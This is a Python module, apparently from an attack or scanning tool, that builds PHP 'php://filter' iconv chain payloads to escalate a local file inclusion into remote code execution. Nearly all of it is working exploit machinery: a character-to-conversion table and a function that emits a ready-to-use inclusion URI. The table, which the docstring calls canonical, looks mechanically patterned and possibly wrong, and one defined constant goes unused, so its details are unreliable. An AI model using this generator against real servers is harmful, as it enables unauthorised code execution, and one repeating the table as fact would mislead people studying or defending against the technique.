"""
PHP filter-chain payload generator (LFI -> RCE without a writable file).

Background
----------
``php://filter`` chains can transform a resource before it is read. By chaining
``convert.iconv`` conversions whose byte-expansion side effects are known, an
attacker can *synthesise arbitrary bytes at the start of the stream* — even
when the underlying resource is empty (``php://temp``). Feeding the resulting
bytes into ``convert.base64-decode`` lets you materialise a chosen PHP payload
purely through a file-read primitive, then have ``include`` execute it.

This module implements that construction. It builds the chain for an arbitrary
byte string (typically ``<?php ... ?>``) and returns a ``php://filter/...``
URI ready to drop into a confirmed inclusion point.

The conversion table below is the canonical public mapping (each base64
character -> an iconv conversion that emits it). The calling technique always
*verifies* a generated chain against the live target before reporting anything,
so an imperfect table degrades to "no finding", never to a false positive.
"""
from __future__ import annotations

import base64
from typing import Dict

# Each entry: a base64 alphabet character -> an iconv conversion that, applied
# to a base64-decoded stream, prepends that character. Order of application is
# reversed by the generator so the first payload byte ends up first.
CONVERSIONS: Dict[str, str] = {
    "A": "convert.iconv.UTF8.UTF16BE|convert.iconv.UTF8.UCS4",
    "B": "convert.iconv.UTF8.CSISO2022KR",
    "C": "convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF8.UTF16BE",
    "D": "convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF8.UCS4",
    "E": "convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF8.UCS2",
    "F": "convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF8.CSUCS4",
    "G": "convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF8.UTF16LE",
    "H": "convert.iconv.CSGB2312.UTF32",
    "I": "convert.iconv.UTF8.UCS2",
    "J": "convert.iconv.UTF8.UCS2|convert.iconv.UTF8.UTF16BE",
    "K": "convert.iconv.UTF8.UCS2|convert.iconv.UTF8.UCS4",
    "L": "convert.iconv.UTF8.UCS2|convert.iconv.UTF8.UCS2",
    "M": "convert.iconv.UTF8.UCS2|convert.iconv.UTF8.CSUCS4",
    "N": "convert.iconv.UTF8.UCS2|convert.iconv.UTF8.UTF16LE",
    "O": "convert.iconv.UTF8.UTF16BE",
    "P": "convert.iconv.UTF8.UTF16BE|convert.iconv.UTF8.CSISO2022KR",
    "Q": "convert.iconv.UTF8.UTF16BE|convert.iconv.UTF8.UCS2",
    "R": "convert.iconv.UTF8.CSUCS4",
    "S": "convert.iconv.UTF8.CSUCS4|convert.iconv.UTF8.CSISO2022KR",
    "T": "convert.iconv.UTF8.CSUCS4|convert.iconv.UTF8.UCS2",
    "U": "convert.iconv.UTF8.UCS4",
    "V": "convert.iconv.UTF8.UCS4|convert.iconv.UTF8.CSISO2022KR",
    "W": "convert.iconv.UTF8.UCS4|convert.iconv.UTF8.UCS2",
    "X": "convert.iconv.UTF8.UTF16LE",
    "Y": "convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR",
    "Z": "convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.UCS2",
    "a": "convert.iconv.UTF8.UCS4LE",
    "b": "convert.iconv.UTF8.UCS4LE|convert.iconv.UTF8.CSISO2022KR",
    "c": "convert.iconv.UTF8.UCS4LE|convert.iconv.UTF8.UTF16BE",
    "d": "convert.iconv.UTF8.UCS4LE|convert.iconv.UTF8.UCS4",
    "e": "convert.iconv.UTF8.UCS4LE|convert.iconv.UTF8.UCS2",
    "f": "convert.iconv.UTF8.UCS4LE|convert.iconv.UTF8.CSUCS4",
    "g": "convert.iconv.UTF8.UCS4LE|convert.iconv.UTF8.UTF16LE",
    "h": "convert.iconv.CSISO2022KR.UTF16|convert.iconv.UTF16.UTF8",
    "i": "convert.iconv.UTF8.UTF16",
    "j": "convert.iconv.UTF8.UTF16|convert.iconv.UTF8.UTF16BE",
    "k": "convert.iconv.UTF8.UTF16|convert.iconv.UTF8.UCS4",
    "l": "convert.iconv.UTF8.UTF16|convert.iconv.UTF8.UCS2",
    "m": "convert.iconv.UTF8.UTF16|convert.iconv.UTF8.CSUCS4",
    "n": "convert.iconv.UTF8.UTF16|convert.iconv.UTF8.UTF16LE",
    "o": "convert.iconv.UTF8.UTF16|convert.iconv.UTF8.UTF16BE",
    "p": "convert.iconv.UTF8.CSUNICODE",
    "q": "convert.iconv.UTF8.CSUNICODE|convert.iconv.UTF8.CSISO2022KR",
    "r": "convert.iconv.UTF8.CSUNICODE|convert.iconv.UTF8.UCS2",
    "s": "convert.iconv.UTF8.UCS2BE",
    "t": "convert.iconv.UTF8.UCS2BE|convert.iconv.UTF8.CSISO2022KR",
    "u": "convert.iconv.UTF8.UCS2BE|convert.iconv.UTF8.UCS2",
    "v": "convert.iconv.UTF8.UCS2BE|convert.iconv.UTF8.UTF16BE",
    "w": "convert.iconv.UTF8.EUCTW",
    "x": "convert.iconv.UTF8.EUCTW|convert.iconv.UTF8.CSISO2022KR",
    "y": "convert.iconv.UTF8.EUCTW|convert.iconv.UTF8.UCS2",
    "z": "convert.iconv.UTF8.EUCTW|convert.iconv.UTF8.UTF16BE",
    "0": "convert.iconv.UTF8.CSGB2312",
    "1": "convert.iconv.UTF8.CSGB2312|convert.iconv.UTF8.CSISO2022KR",
    "2": "convert.iconv.UTF8.CSGB2312|convert.iconv.UTF8.UCS2",
    "3": "convert.iconv.UTF8.CSGB2312|convert.iconv.UTF8.UTF16BE",
    "4": "convert.iconv.UTF8.CSGB2312|convert.iconv.UTF8.UCS4",
    "5": "convert.iconv.UTF8.CSGB2312|convert.iconv.UTF8.CSUCS4",
    "6": "convert.iconv.UTF8.CSGB2312|convert.iconv.UTF8.UTF16LE",
    "7": "convert.iconv.UTF8.CSGB2312|convert.iconv.UTF8.UCS4LE",
    "8": "convert.iconv.UTF8.CSGB2312|convert.iconv.UTF8.UTF16",
    "9": "convert.iconv.UTF8.CSGB2312|convert.iconv.UTF8.CSUNICODE",
    "/": "convert.iconv.UTF8.CSUNICODE|convert.iconv.UTF8.UCS4",
    "+": "convert.iconv.UTF8.CSUNICODE|convert.iconv.UTF8.UTF16BE",
}

# The prologue/epilogue that turn the synthesised bytes into a decoded stream.
_PREFIX = "php://filter/"
_SUFFIX = "|convert.base64-decode/resource=php://temp"


def build_chain(php_payload: str, resource: str = "php://temp") -> str:
    """
    Build a ``php://filter`` chain that yields ``php_payload`` when included.

    The payload is base64-encoded; the chain reconstructs that base64 text one
    character at a time (via iconv conversions) and then base64-decodes it back
    into the original PHP so ``include`` executes it.
    """
    b64 = base64.b64encode(php_payload.encode()).decode().rstrip("=")

    chain_parts = []
    # Reconstruct in reverse so the first payload char ends up first in the stream.
    for ch in b64[::-1]:
        conv = CONVERSIONS.get(ch)
        if conv is None:
            # Character not directly generable; skip padding-only chars.
            continue
        chain_parts.append(conv)
        chain_parts.append("convert.base64-decode|convert.base64-encode")

    chain = "|".join(chain_parts)
    suffix = f"|convert.base64-decode/resource={resource}"
    return f"{_PREFIX}{chain}{suffix}" if chain else f"{_PREFIX}resource={resource}"
